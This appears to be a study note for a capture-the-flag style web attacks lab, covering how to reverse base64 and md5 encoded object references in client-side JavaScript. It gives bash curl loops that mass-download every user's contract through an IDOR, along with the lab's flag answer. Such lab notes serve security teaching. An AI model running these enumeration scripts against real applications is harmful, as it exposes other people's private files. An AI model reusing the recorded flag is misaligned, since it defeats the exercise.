# NOTE — Web Attacks § 9: Bypassing Encoded References

## ID
533

## Module
Web Attacks

## Kind
notes

## Title
Section 9 — Bypassing Encoded References

## Description
Reverse-engineers an encoded object reference (base64 of uid) used in a contract download endpoint to exploit an IDOR and mass-download all employee contracts.

## Tags
idor, encoded-references, base64, md5, mass-enumeration, bash-scripting

## Commands
- echo -n <UID> | base64 -w 0
- echo -n <UID> | base64 -w 0 | md5sum | tr -d ' -'
- curl -sOJ "http://<TARGET>:<PORT>/download.php?contract=<BASE64_UID>"
- curl -sOJ -X POST -d "contract=<MD5_HASH>" http://<TARGET>:<PORT>/download.php
- ls -lAS contract_*

## What This Section Covers
When web apps hash or encode object references instead of using cleartext IDs, the IDOR may look secure — but if the encoding logic is exposed in client-side JavaScript, attackers can reverse it. This section shows how to identify the encoding scheme from front-end source code, replicate it for arbitrary uids, and script mass enumeration of all users' files.

## Methodology
1. Browse to `/contracts.php` and view page source — find the `downloadContract()` JavaScript function
2. Identify the encoding chain: the function applies `btoa(uid)` (base64) and optionally `CryptoJS.MD5()` before sending as the `contract` parameter
3. Test with your own uid: `echo -n 1 | base64 -w 0` → use the output as the contract value
4. Confirm it downloads your contract successfully
5. Script a loop over uids 1–20, encoding each and downloading via `curl -sOJ`
6. Use `ls -lAS contract_*` to find the non-empty file (all others are 0 bytes)
7. `cat` the non-empty PDF to extract the flag

## Multi-step Workflow
```bash
# Actual lab uses base64(uid) via GET
for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0); do
        curl -sOJ "http://$1/download.php?contract=$hash"
    done
done
```

```bash
# Teaching material version uses md5(base64(uid)) via POST
for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" "http://$1/download.php"
    done
done
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Download first 20 contracts, find the flag | HTB{h45h1n6_1d5_w0n7_570p_m3} | Looped base64(uid) for uids 1–20 via GET, non-empty file was `contract_98f13708210194c475687be6106a3b84.pdf` |

## Key Takeaways
- Encoded/hashed references are NOT secure if the encoding logic is in client-side JavaScript — always check page source for functions handling downloads or API calls
- The pattern to reverse: find the JS function → identify the encoding chain → replicate in bash with `echo -n | base64 -w 0 | md5sum`
- Use `-n` with echo and `-w 0` with base64 to avoid newline characters that change the hash
- `curl -sOJ` is essential: `-O` saves with the server's filename, `-J` uses the Content-Disposition header filename
- After mass download, `ls -lAS` quickly identifies the non-empty file among dozens of 0-byte decoys

## Gotchas
- The teaching material describes `md5(base64(uid))` via POST, but the actual lab accepts plain `base64(uid)` via GET — always verify the real endpoint behavior
- Forgetting `-n` on `echo` or `-w 0` on `base64` adds newlines that completely change the resulting hash
- `tr -d ' -'` is needed to strip the trailing ` -` from `md5sum` output when using it in scripts
